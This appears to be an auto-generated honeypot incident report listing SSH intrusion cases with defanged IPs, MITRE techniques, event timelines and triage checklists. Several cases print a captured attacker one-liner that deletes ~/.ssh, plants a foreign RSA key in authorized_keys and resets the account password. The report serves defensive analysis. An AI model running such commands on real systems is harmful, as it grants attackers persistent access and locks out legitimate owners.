| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~, cat /proc/cpuinfo | grep name | wc -l, echo -e "liviu\n01Wa3wH8j42r\n01Wa3wH8j42r"|passwd|bash, Enter new UNIX password: ` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **TTPs (MITRE)** | T1021.004 · T1053.003 · T1057 · T1059.004 · T1078 · T1083 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-10-06 03:35:07` | `cowrie.session.connect` |
| `2026-10-06 03:35:07` | `cowrie.client.version` |
| `2026-10-06 03:35:07` | `cowrie.client.kex` |
| `2026-10-06 03:35:08` | `cowrie.login.success` |
| `2026-10-06 03:35:08` | `cowrie.session.params` |
| `2026-10-06 03:35:08` | `cowrie.command.input` |
| `2026-10-06 03:35:08` | `cowrie.command.failed` |
| `2026-10-06 03:35:09` | `cowrie.log.closed` |
| `2026-10-06 03:35:09` | `cowrie.session.params` |
| `2026-10-06 03:35:09` | `cowrie.command.input` |
| `2026-10-06 03:35:10` | `cowrie.session.file_download` |
| `2026-10-06 03:35:10` | `cowrie.log.closed` |
| `2026-10-06 03:35:38` | `cowrie.session.params` |
| `2026-10-06 03:35:38` | `cowrie.command.input` |
| `2026-10-06 03:35:38` | `cowrie.log.closed` |
| … | _49 more event(s) — see ir_cases.json_ |

**Recommended Actions:**
- [ ] Submit `194.226.49[.]237` to AbuseIPDB if not already reported
- [ ] Block `194.226.49[.]237` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Run Tool 31 malware analyzer on captured payload(s)
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f8d808235b6b

| Field | Detail |
|---|---|
| **Source IP** | `93.177.157[.]179` |
| **First Seen** | 2026-10-06 03:35 |
| **Last Seen** | 2026-10-06 03:35 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-10-06 03:35:30` | `cowrie.session.connect` |
| `2026-10-06 03:35:30` | `cowrie.client.version` |
| `2026-10-06 03:35:30` | `cowrie.client.kex` |
| `2026-10-06 03:35:31` | `cowrie.login.success` |
| `2026-10-06 03:35:31` | `cowrie.direct-tcpip.request` |
| `2026-10-06 03:35:35` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `93.177.157[.]179` to AbuseIPDB if not already reported
- [ ] Block `93.177.157[.]179` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6c9e16cf0af4

| Field | Detail |
|---|---|
| **Source IP** | `203.198.129[.]123` |
| **First Seen** | 2026-10-06 03:35 |
| **Last Seen** | 2026-10-06 03:35 |
| **Session Duration** | 10s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-10-06 03:35:36` | `cowrie.session.connect` |
| `2026-10-06 03:35:37` | `cowrie.client.version` |
| `2026-10-06 03:35:37` | `cowrie.client.kex` |
| `2026-10-06 03:35:39` | `cowrie.login.success` |
| `2026-10-06 03:35:41` | `cowrie.direct-tcpip.request` |
| `2026-10-06 03:35:46` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `203.198.129[.]123` to AbuseIPDB if not already reported
- [ ] Block `203.198.129[.]123` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-31dc5f03eb79

| Field | Detail |
|---|---|
| **Source IP** | `70.54.182[.]130` |
| **First Seen** | 2026-10-06 03:42 |
| **Last Seen** | 2026-10-06 03:42 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-10-06 03:42:56` | `cowrie.session.connect` |
| `2026-10-06 03:42:56` | `cowrie.client.version` |
| `2026-10-06 03:42:56` | `cowrie.client.kex` |
| `2026-10-06 03:42:57` | `cowrie.login.success` |
| `2026-10-06 03:42:57` | `cowrie.session.params` |
| `2026-10-06 03:42:57` | `cowrie.command.input` |
| `2026-10-06 03:42:57` | `cowrie.command.failed` |
| `2026-10-06 03:42:57` | `cowrie.log.closed` |
| `2026-10-06 03:42:58` | `cowrie.session.params` |
| `2026-10-06 03:42:58` | `cowrie.command.input` |
| `2026-10-06 03:42:58` | `cowrie.session.file_download` |
| `2026-10-06 03:42:58` | `cowrie.log.closed` |
| `2026-10-06 03:42:58` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `70.54.182[.]130` to AbuseIPDB if not already reported
- [ ] Block `70.54.182[.]130` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Run Tool 31 malware analyzer on captured payload(s)
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4a8f47696b58

| Field | Detail |
|---|---|
| **Source IP** | `70.54.182[.]130` |
| **First Seen** | 2026-10-06 03:42 |
| **Last Seen** | 2026-10-06 03:42 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-10-06 03:42:58` | `cowrie.session.connect` |
| `2026-10-06 03:42:58` | `cowrie.client.version` |
| `2026-10-06 03:42:58` | `cowrie.client.kex` |
| `2026-10-06 03:42:58` | `cowrie.login.success` |
| `2026-10-06 03:42:58` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `70.54.182[.]130` to AbuseIPDB if not already reported
- [ ] Block `70.54.182[.]130` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7eafa9cedffd

| Field | Detail |
|---|---|
| **Source IP** | `14.46.87[.]209` |
| **First Seen** | 2026-10-06 03:49 |
| **Last Seen** | 2026-10-06 03:49 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-10-06 03:49:23` | `cowrie.session.connect` |
| `2026-10-06 03:49:23` | `cowrie.client.version` |
| `2026-10-06 03:49:23` | `cowrie.client.kex` |
| `2026-10-06 03:49:24` | `cowrie.login.success` |
| `2026-10-06 03:49:25` | `cowrie.session.params` |
| `2026-10-06 03:49:25` | `cowrie.command.input` |
| `2026-10-06 03:49:25` | `cowrie.command.failed` |
| `2026-10-06 03:49:25` | `cowrie.log.closed` |
| `2026-10-06 03:49:26` | `cowrie.session.params` |
| `2026-10-06 03:49:26` | `cowrie.command.input` |
| `2026-10-06 03:49:26` | `cowrie.session.file_download` |
| `2026-10-06 03:49:26` | `cowrie.log.closed` |
| `2026-10-06 03:49:29` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `14.46.87[.]209` to AbuseIPDB if not already reported
- [ ] Block `14.46.87[.]209` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Run Tool 31 malware analyzer on captured payload(s)
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-157eb5c218a0

| Field | Detail |
|---|---|
| **Source IP** | `14.46.87[.]209` |
| **First Seen** | 2026-10-06 03:49 |
| **Last Seen** | 2026-10-06 03:49 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-10-06 03:49:26` | `cowrie.session.connect` |
| `2026-10-06 03:49:26` | `cowrie.client.version` |
| `2026-10-06 03:49:27` | `cowrie.client.kex` |
| `2026-10-06 03:49:28` | `cowrie.login.success` |
| `2026-10-06 03:49:28` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `14.46.87[.]209` to AbuseIPDB if not already reported
- [ ] Block `14.46.87[.]209` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6f5a73d53ff9

| Field | Detail |
|---|---|
| **Source IP** | `103.146.52[.]157` |
| **First Seen** | 2026-10-06 03:54 |
| **Last Seen** | 2026-10-06 03:54 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-10-06 03:54:10` | `cowrie.session.connect` |
| `2026-10-06 03:54:10` | `cowrie.client.version` |
| `2026-10-06 03:54:10` | `cowrie.client.kex` |
| `2026-10-06 03:54:11` | `cowrie.login.success` |
| `2026-10-06 03:54:11` | `cowrie.session.params` |
| `2026-10-06 03:54:11` | `cowrie.command.input` |
| `2026-10-06 03:54:11` | `cowrie.command.failed` |
| `2026-10-06 03:54:11` | `cowrie.log.closed` |
| `2026-10-06 03:54:12` | `cowrie.session.params` |
| `2026-10-06 03:54:12` | `cowrie.command.input` |
| `2026-10-06 03:54:12` | `cowrie.session.file_download` |
| `2026-10-06 03:54:12` | `cowrie.log.closed` |
| `2026-10-06 03:54:14` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.146.52[.]157` to AbuseIPDB if not already reported
- [ ] Block `103.146.52[.]157` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Run Tool 31 malware analyzer on captured payload(s)
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-fd0318ded791

| Field | Detail |
|---|---|
| **Source IP** | `103.146.52[.]157` |
| **First Seen** | 2026-10-06 03:54 |
| **Last Seen** | 2026-10-06 03:54 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-10-06 03:54:12` | `cowrie.session.connect` |
| `2026-10-06 03:54:12` | `cowrie.client.version` |
| `2026-10-06 03:54:12` | `cowrie.client.kex` |
| `2026-10-06 03:54:12` | `cowrie.login.success` |
| `2026-10-06 03:54:13` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.146.52[.]157` to AbuseIPDB if not already reported
- [ ] Block `103.146.52[.]157` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-42bfc1610662

| Field | Detail |
|---|---|
| **Source IP** | `109.160.32[.]128` |
| **First Seen** | 2026-10-06 04:00 |
| **Last Seen** | 2026-10-06 04:00 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-10-06 04:00:02` | `cowrie.session.connect` |
| `2026-10-06 04:00:02` | `cowrie.client.version` |
| `2026-10-06 04:00:03` | `cowrie.client.kex` |
| `2026-10-06 04:00:03` | `cowrie.login.success` |
| `2026-10-06 04:00:04` | `cowrie.session.params` |
| `2026-10-06 04:00:04` | `cowrie.command.input` |
| `2026-10-06 04:00:04` | `cowrie.log.closed` |
| `2026-10-06 04:00:04` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `109.160.32[.]128` to AbuseIPDB if not already reported
- [ ] Block `109.160.32[.]128` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-570a1748f8b3

| Field | Detail |
|---|---|
| **Source IP** | `103.86.180[.]10` |
| **First Seen** | 2026-10-06 04:00 |
| **Last Seen** | 2026-10-06 04:00 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-10-06 04:00:28` | `cowrie.session.connect` |
| `2026-10-06 04:00:28` | `cowrie.client.version` |
| `2026-10-06 04:00:29` | `cowrie.client.kex` |
| `2026-10-06 04:00:29` | `cowrie.login.success` |
| `2026-10-06 04:00:30` | `cowrie.session.params` |
| `2026-10-06 04:00:30` | `cowrie.command.input` |
| `2026-10-06 04:00:30` | `cowrie.command.failed` |
| `2026-10-06 04:00:31` | `cowrie.log.closed` |
| `2026-10-06 04:00:32` | `cowrie.session.params` |
| `2026-10-06 04:00:32` | `cowrie.command.input` |
| `2026-10-06 04:00:32` | `cowrie.session.file_download` |
| `2026-10-06 04:00:32` | `cowrie.log.closed` |
| `2026-10-06 04:00:35` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.86.180[.]10` to AbuseIPDB if not already reported
- [ ] Block `103.86.180[.]10` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Run Tool 31 malware analyzer on captured payload(s)
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-cd1eec111b7c

| Field | Detail |
|---|---|
| **Source IP** | `103.86.180[.]10` |
| **First Seen** | 2026-10-06 04:00 |
| **Last Seen** | 2026-10-06 04:00 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-10-06 04:00:32` | `cowrie.session.connect` |
| `2026-10-06 04:00:32` | `cowrie.client.version` |
| `2026-10-06 04:00:32` | `cowrie.client.kex` |
| `2026-10-06 04:00:34` | `cowrie.login.success` |
| `2026-10-06 04:00:34` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.86.180[.]10` to AbuseIPDB if not already reported
- [ ] Block `103.86.180[.]10` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### Additional priority cases (254) — compact view

| Case | Severity | Source IP | First Seen | Auth | Cmds | DL | TTPs |
|---|---|---|---|---|---|---|---|
| IR-80dab871d476 | HIGH | `114.219.157[.]97` | 2026-10-06 04:00 | Y | 0 | 0 | `T1078 · T1592` |
| IR-bf5be13d524a | HIGH | `59.36.72[.]234` | 2026-10-06 04:01 | Y | 0 | 0 | `T1078 · T1592` |
| IR-c978cff8b362 | HIGH | `117.50.199[.]249` | 2026-10-06 04:03 | Y | 2 | 1 | `T1021.004 · T1078 · T1105` |
| IR-1b247574fb2c | HIGH | `117.50.199[.]249` | 2026-10-06 04:03 | Y | 0 | 0 | `T1078 · T1592` |
| IR-896c804642ba | HIGH | `116.228.141[.]62` | 2026-10-06 04:04 | Y | 2 | 1 | `T1021.004 · T1078 · T1105` |
| IR-d97d0ecbca6b | HIGH | `116.228.141[.]62` | 2026-10-06 04:04 | Y | 0 | 0 | `T1078 · T1592` |
| IR-2586d70950d0 | HIGH | `2.188.206[.]146` | 2026-10-06 04:04 | Y | 1 | 0 | `T1078 · T1592` |
| IR-870c393c2d4d | HIGH | `218.15.224[.]102` | 2026-10-06 04:04 | Y | 0 | 0 | `T1078 · T1592` |
| IR-c630a00f815c | HIGH | `196.188.93[.]169` | 2026-10-06 04:04 | Y | 0 | 0 | `T1078 · T1592` |
| IR-5a6020511caf | HIGH | `114.219.157[.]97` | 2026-10-06 04:07 | Y | 1 | 0 | `T1021.004 · T1078 · T1592` |
| IR-674f47b80f25 | HIGH | `92.118.39[.]71` | 2026-10-06 04:07 | Y | 10 | 0 | `T1059.004 · T1078 · T1083` |
| IR-8373b9d767fe | HIGH | `108.174.145[.]192` | 2026-10-06 04:07 | Y | 2 | 1 | `T1021.004 · T1078 · T1105` |
| IR-ed71aabbf851 | HIGH | `108.174.145[.]192` | 2026-10-06 04:07 | Y | 0 | 0 | `T1078 · T1592` |
| IR-7380199f06d3 | HIGH | `106.75.226[.]5` | 2026-10-06 04:13 | Y | 1 | 0 | `T1021.004 · T1078 · T1592` |
| IR-c9973b21836d | HIGH | `103.143.239[.]201` | 2026-10-06 04:25 | Y | 2 | 1 | `T1021.004 · T1078 · T1105` |
| IR-3b35e4e41e86 | HIGH | `103.143.239[.]201` | 2026-10-06 04:25 | Y | 0 | 0 | `T1078 · T1592` |
| IR-1e2880da7b48 | HIGH | `77.239.124[.]66` | 2026-10-06 04:29 | Y | 0 | 0 | `T1078 · T1592` |
| IR-ca424511e474 | HIGH | `176.53.159[.]196` | 2026-10-06 04:37 | Y | 0 | 0 | `T1078 · T1592` |
| IR-19c7ed8ac18f | HIGH | `35.233.35[.]44` | 2026-10-06 04:42 | Y | 2 | 0 | `T1078` |
| IR-e7531f658941 | HIGH | `35.233.35[.]44` | 2026-10-06 04:42 | Y | 1 | 0 | `T1078` |
| IR-d169f932b876 | HIGH | `35.233.35[.]44` | 2026-10-06 04:43 | Y | 0 | 0 | `T1078` |
| IR-580a27c11bcd | HIGH | `103.49.238[.]23` | 2026-10-06 04:46 | Y | 2 | 1 | `T1021.004 · T1078 · T1105` |
| IR-86156cd610bd | HIGH | `103.49.238[.]23` | 2026-10-06 04:46 | Y | 0 | 0 | `T1078 · T1592` |
| IR-33984c7a6c14 | HIGH | `159.65.224[.]88` | 2026-10-06 04:49 | Y | 2 | 1 | `T1021.004 · T1078 · T1105` |
| IR-e46d6c08588b | HIGH | `159.65.224[.]88` | 2026-10-06 04:49 | Y | 0 | 0 | `T1078 · T1592` |
| IR-c3bd32965cf7 | HIGH | `94.154.43[.]69` | 2026-10-06 04:49 | Y | 2 | 6 | `T1059.004 · T1078 · T1105` |
| IR-6986a071e15d | HIGH | `125.142.37[.]91` | 2026-10-06 04:53 | Y | 2 | 1 | `T1021.004 · T1078 · T1105` |
| IR-8905d05205bb | HIGH | `125.142.37[.]91` | 2026-10-06 04:53 | Y | 0 | 0 | `T1078 · T1592` |
| IR-d820d8084642 | HIGH | `65.181.71[.]117` | 2026-10-06 04:53 | Y | 2 | 1 | `T1021.004 · T1078 · T1105` |
| IR-2c001327d36f | HIGH | `65.181.71[.]117` | 2026-10-06 04:53 | Y | 0 | 0 | `T1078 · T1592` |
| IR-82a833a6d457 | HIGH | `218.13.214[.]18` | 2026-10-06 04:54 | Y | 0 | 0 | `T1078 · T1592` |
| IR-28434907c769 | HIGH | `118.91.176[.]243` | 2026-10-06 04:54 | Y | 0 | 0 | `T1078 · T1592` |
| IR-dcf60f02f705 | HIGH | `94.154.43[.]69` | 2026-10-06 04:58 | Y | 2 | 6 | `T1059.004 · T1078 · T1105` |
| IR-9552ece4c202 | HIGH | `180.76.243[.]197` | 2026-10-06 04:58 | Y | 1 | 0 | `T1021.004 · T1078 · T1592` |
| IR-fd4f63501dd2 | HIGH | `180.76.243[.]197` | 2026-10-06 04:58 | Y | 0 | 0 | `T1078 · T1592` |
| IR-1b0b76f6e1a3 | HIGH | `156.232.13[.]246` | 2026-10-06 05:00 | Y | 2 | 1 | `T1021.004 · T1078 · T1105` |
| IR-8142360c09dc | HIGH | `156.232.13[.]246` | 2026-10-06 05:00 | Y | 0 | 0 | `T1078 · T1592` |
| IR-4db968b8c833 | HIGH | `221.229.218[.]50` | 2026-10-06 05:03 | Y | 2 | 0 | `T1021.004 · T1078 · T1592` |
| IR-f358542b1afa | HIGH | `221.229.218[.]50` | 2026-10-06 05:03 | Y | 0 | 0 | `T1078 · T1592` |
| IR-29984ab99e74 | HIGH | `190.129.122[.]185` | 2026-10-06 05:05 | Y | 2 | 1 | `T1021.004 · T1078 · T1105` |
| IR-723b086378ea | HIGH | `190.129.122[.]185` | 2026-10-06 05:05 | Y | 0 | 0 | `T1078 · T1592` |
| IR-266f25721177 | HIGH | `223.123.92[.]106` | 2026-10-06 05:15 | Y | 16 | 0 | `T1003.008 · T1021.004 · T1059.004` |
| IR-de74d2a7b25c | HIGH | `34.52.207[.]139` | 2026-10-06 05:20 | Y | 2 | 0 | `T1078` |
| IR-90bd1ae097ff | HIGH | `34.52.207[.]139` | 2026-10-06 05:20 | Y | 1 | 0 | `T1078` |
| IR-cba5281e8867 | HIGH | `34.52.207[.]139` | 2026-10-06 05:20 | Y | 0 | 0 | `T1078` |
| IR-36db86048dc7 | HIGH | `109.160.32[.]116` | 2026-10-06 05:30 | Y | 1 | 0 | `T1078 · T1592` |
| IR-6b14069c276c | HIGH | `188.168.86[.]6` | 2026-10-06 05:43 | Y | 0 | 0 | `T1078 · T1592` |
| IR-7661c024b392 | HIGH | `90.230.226[.]175` | 2026-10-06 05:46 | Y | 0 | 0 | `T1078 · T1592` |
| IR-ebc91a49b651 | HIGH | `196.188.187[.]205` | 2026-10-06 05:46 | Y | 0 | 0 | `T1078 · T1592` |
| IR-5487cd9aefce | HIGH | `176.65.134[.]119` | 2026-10-06 05:51 | Y | 4 | 0 | `T1078 · T1110.001` |
| IR-b1b6d208ac2c | HIGH | `176.65.134[.]119` | 2026-10-06 05:51 | Y | 9 | 2 | `T1059.004 · T1078 · T1105` |
| IR-7882b6fcd318 | HIGH | `83.226.181[.]38` | 2026-10-06 05:56 | Y | 0 | 0 | `T1078 · T1592` |
| IR-6e72216fc320 | HIGH | `183.196.144[.]45` | 2026-10-06 05:56 | Y | 0 | 0 | `T1078 · T1592` |
| IR-c79f5e3f1aae | HIGH | `109.160.32[.]116` | 2026-10-06 06:00 | Y | 1 | 0 | `T1078 · T1592` |
| IR-44d509e21813 | HIGH | `176.53.159[.]196` | 2026-10-06 06:01 | Y | 0 | 0 | `T1078 · T1592` |
| IR-2b245a1f61e4 | HIGH | `189.204.230[.]91` | 2026-10-06 06:03 | Y | 2 | 1 | `T1021.004 · T1078 · T1105` |
| IR-887b95b2f6a1 | HIGH | `189.204.230[.]91` | 2026-10-06 06:03 | Y | 0 | 0 | `T1078 · T1592` |
| IR-ce2cf635043a | HIGH | `156.232.13[.]218` | 2026-10-06 06:07 | Y | 2 | 1 | `T1021.004 · T1078 · T1105` |
| IR-348175220a52 | HIGH | `156.232.13[.]218` | 2026-10-06 06:08 | Y | 0 | 0 | `T1078 · T1592` |
| IR-61dbbb1c09ec | HIGH | `117.204.1[.]45` | 2026-10-06 06:10 | Y | 0 | 0 | `T1078 · T1592` |
| IR-119be4c971ac | HIGH | `36.134.211[.]170` | 2026-10-06 06:10 | Y | 2 | 1 | `T1021.004 · T1078 · T1105` |
| IR-80d9129edd0a | HIGH | `36.134.211[.]170` | 2026-10-06 06:10 | Y | 0 | 0 | `T1078 · T1592` |
| IR-7ab56ae10001 | HIGH | `34.62.194[.]208` | 2026-10-06 06:10 | Y | 2 | 0 | `T1078` |
| IR-77e3a5b698f7 | HIGH | `34.62.194[.]208` | 2026-10-06 06:11 | Y | 1 | 0 | `T1078` |
| IR-ca1b1b2c8a0b | HIGH | `34.62.194[.]208` | 2026-10-06 06:11 | Y | 0 | 0 | `T1078` |
| IR-fddba68d1d57 | HIGH | `14.29.170[.]54` | 2026-10-06 06:12 | Y | 2 | 1 | `T1021.004 · T1078 · T1105` |
| IR-7ca439a80f2a | HIGH | `2.188.206[.]146` | 2026-10-06 06:14 | Y | 1 | 0 | `T1078 · T1592` |
| IR-8c71d110bd52 | HIGH | `20.12.41[.]6` | 2026-10-06 06:20 | Y | 2 | 1 | `T1021.004 · T1078 · T1105` |
| IR-6a7fc693d2bc | HIGH | `20.12.41[.]6` | 2026-10-06 06:20 | Y | 0 | 0 | `T1078 · T1592` |
| IR-3716326ae39f | HIGH | `77.239.124[.]45` | 2026-10-06 06:22 | Y | 0 | 0 | `T1078 · T1592` |
| IR-d66bbf335c72 | HIGH | `63.135.169[.]175` | 2026-10-06 06:44 | Y | 0 | 0 | `T1078 · T1592` |
